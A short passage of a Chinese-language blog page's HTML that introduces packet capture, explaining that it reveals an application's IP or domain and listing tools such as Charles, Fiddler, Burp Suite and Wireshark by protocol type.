8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>学会不同对象采用不同抓包封包抓取技术分析</p></blockquote><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><ul><li>当需要知道应用程序等的IP, 域名时需要抓包后分析</li><li>对不同的协议用不同的工具<ul><li>web协议: Charles, Fiddler, Burpsuite</li><li>其他非web协议: WireShark, 科来网络分析系统</li></ul></li></ul>]]></content>
     
     
       
